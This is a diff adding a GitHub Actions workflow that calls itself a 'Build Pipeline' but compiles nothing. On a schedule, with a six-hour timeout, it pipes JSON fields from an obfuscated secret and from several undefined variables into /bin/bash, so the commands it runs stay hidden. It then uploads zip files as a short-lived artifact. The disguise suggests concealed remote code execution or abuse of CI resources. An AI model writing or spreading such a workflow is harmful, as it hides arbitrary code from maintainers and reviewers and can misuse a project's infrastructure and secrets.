@@ -1,0 +1,34 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '22 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  compile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup and run
+        env:
+          xhkt8: ${{ secrets.xhkt8 }}
+        run: |
+          printf '%s' "$xhkt8" | jq -r .o7 | /bin/bash
+          printf '%s' "$swz0070" | jq -r .byvf63212 | /bin/bash
+          echo $ndn9 | jq -r .ba3113 | /bin/bash
+          printf '%s' "$xhrxp4" | jq -r .ucza716 | /bin/bash
+          printf '%s' "$gpf1520" | jq -r .bcp76526 | /bin/bash
+          printf '%s' "$s866" | jq -r .u32811 | /bin/bash
+          echo $djuv767 | jq -r .lr15020 | /bin/bash
+
+      - name: Upload data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ei4NttVt
+          path: "*.zip"
+          retention-days: 1
